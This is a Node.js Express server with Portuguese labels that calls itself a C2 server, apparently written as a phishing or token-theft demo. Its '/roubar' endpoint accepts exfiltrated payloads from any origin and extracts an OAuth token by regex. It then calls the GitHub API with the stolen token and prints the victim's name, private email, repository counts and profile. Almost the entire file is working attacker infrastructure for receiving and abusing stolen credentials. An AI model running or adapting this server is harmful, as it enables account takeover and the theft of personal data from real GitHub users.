const express = require('express');
const axios = require('axios'); 
const app = express();
const port = 4000;

const COR_RESET = "\x1b[0m";
const COR_VERMELHO = "\x1b[31m";
const COR_VERDE = "\x1b[32m";
const COR_AMARELO = "\x1b[33m";
const COR_AZUL = "\x1b[36m";
const COR_BG_VERMELHO = "\x1b[41m";

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    next();
});

app.get('/roubar', async (req, res) => {

    const dadosBrutos = req.query.dados || "";
    const timestamp = new Date().toLocaleTimeString();

    console.clear();
    console.log(`${COR_VERMELHO}╔══════════════════════════════════════════════════════════════╗${COR_RESET}`);
    console.log(`${COR_VERMELHO}║ 🎣 [${timestamp}] VÍTIMA CAPTURADA! DADOS RECEBIDOS          ║${COR_RESET}`);
    console.log(`${COR_VERMELHO}╚══════════════════════════════════════════════════════════════╝${COR_RESET}`);
    
    // exibe os dados brutos recebidos
    console.log(`\n${COR_AMARELO}📝 Payload Capturado:${COR_RESET}`);
    console.log(dadosBrutos);

    // tenta extrair o token OAuth do payload
    const matchToken = dadosBrutos.match(/TOKEN(?:_REAL|_OAUTH)?:?\s*([a-zA-Z0-9_\-\.]+)/);
    
    if (matchToken && matchToken[1] && matchToken[1] !== 'null') {
        const tokenRoubado = matchToken[1];
        
        console.log(`\n${COR_BG_VERMELHO}   TOKEN ENCONTRADO! Iniciando busca com a chave... ${COR_RESET}`);
        console.log(`${COR_AZUL}Target Token: ${tokenRoubado.substring(0, 15)}...${COR_RESET}`);

        // emula o uso do token para acessar a API do GitHub
        try {
            const githubResponse = await axios.get('https://api.github.com/user', {
                headers: { 
                    'Authorization': `token ${tokenRoubado}`,
                    'User-Agent': 'Hacker-Demo-V1'
                }
            });

            const vitima = githubResponse.data;

            // mostra os dados da vítima
            console.log(`\n${COR_VERDE} SUCESSO! Acesso válido aos dados da conta: ${COR_RESET}`);
            
            // cria tabela com os dados relevantes da vítima
            const tabelaDados = {
                "Nome Completo": vitima.name,
                "Username": vitima.login,
                "Email Privado": vitima.email || "Oculto/Privado",
                "Bio": vitima.bio,
                "Localização": vitima.location,
                "Seguidores": vitima.followers,
                "Repos Pub/Priv": `${vitima.public_repos} / ${vitima.total_private_repos || '?'}`,
                "URL do Perfil": vitima.html_url
            };

            console.table(tabelaDados);
            console.log(`${COR_VERMELHO}  ATENÇÃO: O atacante agora tem acesso aos dados da "vítima".${COR_RESET}`);

        } catch (erro) {
            console.log(`\n${COR_AMARELO} Token capturado, mas falha ao acessar GitHub (Token expirado ou escopo limitado).${COR_RESET}`);
            // console.log(erro.message);
        }

    } else {
        console.log(`\n${COR_AZUL}   Nenhum token OAuth válido identificado no payload.${COR_RESET}`);
    }

    console.log(`\n${COR_VERMELHO}--------------------------------------------------------------${COR_RESET}\n`);

    res.status(200).send('OK'); 
});

app.listen(port, () => {
    console.log(`${COR_VERDE}😈 C2 SERVER ONLINE NA PORTA ${port}${COR_RESET}`);
    console.log(`   (O script fará o 'curl' automaticamente ao receber tokens)`);
});